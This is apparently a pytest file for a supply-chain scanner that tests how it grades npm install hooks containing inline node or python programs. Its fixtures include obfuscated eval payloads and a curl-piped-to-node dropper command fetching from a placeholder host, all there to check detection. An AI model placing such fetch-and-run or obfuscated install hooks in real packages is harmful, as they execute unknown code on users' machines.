"""An install hook's inline program is read as install-time code (review 98).

`node -e "<program>"` in a `postinstall` was judged by a word list: the flag itself made the hook
HIGH, and the content detectors never read the program. Lifted into a unit of its own, the
program is read like the file `node install.js` runs, and the hook is graded the same way.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.analysis.shared.inline_programs import InlinePrograms
from cordon_scanner.decide.policy import PolicyGate
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Severity

INSTALL_RULE = "SUSPECT.INSTALL.SCRIPT.001"


class HookKit:
    @staticmethod
    def npm_package(tmp_path: Path, scripts: dict[str, str], **extra: str) -> Path:
        manifest = json.dumps({"name": "demo-pkg", "version": "1.0.0", "scripts": scripts})
        files = {"package/package.json": manifest, "package/index.js": "module.exports = 1;\n"}
        files.update({f"package/{name}": text for name, text in extra.items()})
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "demo-pkg-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return target

    @staticmethod
    def scan(target: Path):
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(target)


class TestLifting:
    def test_each_inline_program_is_found_with_its_language(self):
        command = "node -e \"console.log(1)\" && python3 -c 'print(2)'"
        programs = InlinePrograms.found("package/package.json", "postinstall", command)
        assert [p.path for p in programs] == [
            "package/package.json#postinstall-0.js",
            "package/package.json#postinstall-1.py",
        ]
        assert [p.source for p in programs] == ["console.log(1)", "print(2)"]

    def test_a_flag_the_interpreter_does_not_take_is_not_a_program(self):
        assert InlinePrograms.found("package.json", "install", "python -e 'x'") == []

    def test_the_command_reads_as_running_the_lifted_files(self):
        command = 'node -e "a()" && make'
        programs = InlinePrograms.found("x.tgz!package/package.json", "install", command)
        assert (
            InlinePrograms.as_file_command(command, programs)
            == "node package.json#install-0.js && make"
        )


class TestGrading:
    def test_a_guard_that_only_checks_the_package_manager_is_recorded_not_raised(self, tmp_path):
        guard = (
            "node -e \"if(process.env.npm_execpath.indexOf('yarn') === -1) "
            "throw new Error('install with yarn')\""
        )
        result = HookKit.scan(HookKit.npm_package(tmp_path, {"preinstall": guard}))
        hooks = [f for f in result.findings if f.rule_id == INSTALL_RULE]
        assert hooks
        assert all(f.severity <= Severity.LOW for f in hooks)

    def test_the_lifted_program_is_read_by_the_content_detectors(self, tmp_path):
        program = "node -e \"eval(Buffer.from('MSsx','base64').toString())\""
        result = HookKit.scan(HookKit.npm_package(tmp_path, {"postinstall": program}))
        paths = {f.location.path for f in result.findings}
        assert any(path.endswith("package/package.json#postinstall-0.js") for path in paths)
        # The word list still sees `eval` and `base64` in the command: the hook stays raised.
        assert any(
            f.rule_id == INSTALL_RULE and f.severity >= Severity.HIGH for f in result.findings
        )
        assert not PolicyGate.evaluate(result, Config.default().policy).passed

    def test_a_program_that_loads_a_file_in_the_package_is_graded_by_that_file(self, tmp_path):
        hook = "node -e \"try{require('./setup.js')}catch(e){}; process.exit(0)\""
        target = HookKit.npm_package(
            tmp_path, {"postinstall": hook}, **{"setup.js": "module.exports = 1;\n"}
        )
        hooks = [f for f in HookKit.scan(target).findings if f.rule_id == INSTALL_RULE]
        assert hooks
        assert all(f.severity <= Severity.LOW for f in hooks)

    def test_a_program_that_loads_a_dependency_stays_raised(self, tmp_path):
        hook = "node -e \"require('some-helper').run()\""
        hooks = HookKit.scan(HookKit.npm_package(tmp_path, {"postinstall": hook})).findings
        assert any(f.rule_id == INSTALL_RULE and f.severity >= Severity.HIGH for f in hooks)

    def test_a_program_that_can_reach_the_network_stays_raised(self, tmp_path):
        hook = "node -e \"require('https').get('https://example.invalid/x')\""
        hooks = HookKit.scan(HookKit.npm_package(tmp_path, {"postinstall": hook})).findings
        assert any(f.rule_id == INSTALL_RULE and f.severity >= Severity.HIGH for f in hooks)

    def test_an_author_time_hook_is_not_lifted(self, tmp_path):
        result = HookKit.scan(
            HookKit.npm_package(tmp_path, {"prepare": 'node -e "eval(process.argv[1])"'})
        )
        assert not any("#prepare" in (f.location.path or "") for f in result.findings)

    def test_a_working_tree_scan_reads_the_lifted_program_too(self, tmp_path):
        # A directory's files are re-read from disk by the workers; a lifted program has no file
        # there and travels with its work item.
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "x", "scripts": {"postinstall": "node -e \"eval(atob('MSsx'))\""}}),
            encoding="utf-8",
        )
        for n in range(40):
            (tmp_path / f"m{n}.js").write_text(f"module.exports = {n};\n", encoding="utf-8")
        config = Config.default().with_overrides(use_cache=False)
        result = Scanner(config).scan(tmp_path)
        assert result.complete
        assert any(
            "package.json#postinstall-0.js" in (f.location.path or "") for f in result.findings
        )


class TestTheCommandAsAShellProgram:
    def test_a_command_doing_shell_work_is_lifted_whole(self):
        command = "curl -s https://example.invalid/u.mjs | node --input-type=module"
        program = InlinePrograms.shell("package/package.json", "postinstall", command)
        assert program is not None
        assert program.path == "package/package.json#postinstall.sh"
        assert program.source == command

    def test_a_command_that_only_names_a_tool_or_a_file_is_not(self):
        for command in ("node-gyp rebuild", "node scripts/postinstall.js", "tsc -p ."):
            assert InlinePrograms.shell("package.json", "install", command) is None

    def test_fetched_code_piped_into_an_interpreter_is_a_dropper(self, tmp_path):
        hook = {"postinstall": "curl -s https://example.invalid/u.mjs | node --input-type=module"}
        result = HookKit.scan(HookKit.npm_package(tmp_path, hook))
        # Reported on the hook's line in the manifest, which a reader can open.
        assert any(
            f.rule_id == "MALWARE.DROPPER.001" and f.location.path.endswith("package/package.json")
            for f in result.findings
        )
